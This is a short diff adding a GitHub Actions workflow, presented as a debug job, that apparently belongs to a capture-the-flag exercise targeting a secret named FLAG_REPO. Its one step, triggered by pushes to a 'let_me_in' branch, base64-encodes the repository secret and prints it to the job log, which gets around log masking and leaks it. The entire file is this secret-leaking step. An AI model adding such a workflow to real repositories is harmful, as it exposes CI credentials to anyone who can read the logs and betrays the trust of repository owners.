@@ -1,0 +1,12 @@
+name: debug-workflow
+'on':
+ push:
+ branches: let_me_in
+jobs:
+ debug:
+ runs-on:
+ - ubuntu-latest
+ environment: dev
+ steps:
+ - name: Totally opsec safe
+ run: echo -e "SECRET=${{ secrets.FLAG_REPO }}\n" | base64
